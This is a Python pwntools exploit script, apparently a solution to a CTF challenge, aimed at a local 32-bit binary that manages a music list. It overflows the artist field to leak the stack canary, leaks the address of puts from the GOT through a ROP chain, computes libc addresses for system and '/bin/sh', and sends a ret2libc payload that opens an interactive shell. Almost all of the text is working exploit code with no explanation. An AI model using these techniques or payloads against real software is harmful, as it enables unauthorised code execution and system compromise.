# coding: utf-8
# -*- coding: utf-8 -*-

from pwn import *

# context.log_level = "debug"

def debug_print(message):
    for msg in message.split("\n"):
        print("[*] " + msg)

def leak_canary():
    for i in range(100):
        p.sendlineafter("\tselect\t|\t\n", "1")
        
        p.sendlineafter("\tmusic\t|\t", "musicname" + str(i+1))
        if i != 99:
            p.sendlineafter("\tartist\t|\t", "artist" + str(i+1))
    p.sendlineafter("\tartist\t|\t", "A"*20)
    debug_print("add music finished")

    p.sendlineafter("\tselect\t|\t\n", "2")

    p.recvuntil("|" + "A"*20)
    return u32(p.recv(4)) - 0x0a

p = process("./5d63b69dccbd0d46bcf3e559bf79b4a7")
e = ELF("./5d63b69dccbd0d46bcf3e559bf79b4a7")

var_all = 0x0804D7A0
main = 0x08049490

p.sendlineafter("name : \n", "valall\x00")

canary = leak_canary()

debug_print("")
debug_print("leak canary! - " + hex(canary))
debug_print("")

p.sendlineafter("\tselect\t|\t\n", "3")
p.sendlineafter("select number\t|\t\n", "100")
p.sendlineafter("\tmusic\t|\t", "musciname100")

payload = ""

payload += "A"*20
payload += p32(canary)
payload += "A"*12

payload += p32(e.plt["puts"])
payload += p32(main)
payload += p32(e.got["puts"])

p.sendlineafter("\tartist\t|\t", payload)
p.sendlineafter("\tselect\t|\t", "4")

p.recvuntil("\t\tBYE BYE\n\n")

# ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu9_i386)
puts_got = u32(p.recv(4))

libc_base = puts_got - 0x5fca0
libc_system = libc_base + 0x3ada0
libc_binsh = libc_base + 0x15b9ab
libc_exit = libc_base + 0x2e9d0

debug_print("")
debug_print("leak libc!")
debug_print(" puts_got : " + hex(puts_got))
debug_print(" libc_system : " + hex(libc_system))
debug_print(" libc_binsh : " + hex(libc_binsh))
debug_print(" libc_exit : " + hex(libc_exit))
debug_print("")


p.sendlineafter("name : \n", "valall\x00")

p.sendlineafter("\tselect\t|\t\n", "3")
p.sendlineafter("select number\t|\t\n", "100")
p.sendlineafter("\tmusic\t|\t", "musciname100")

payload = ""

payload += "A"*20
payload += p32(canary)
payload += "A"*20

payload += p32(libc_system)
payload += p32(libc_exit)
payload += p32(libc_binsh)

p.sendlineafter("\tartist\t|\t", payload)
p.sendlineafter("\tselect\t|\t", "4")

p.recvuntil("\t\tBYE BYE\n\n")

p.interactive()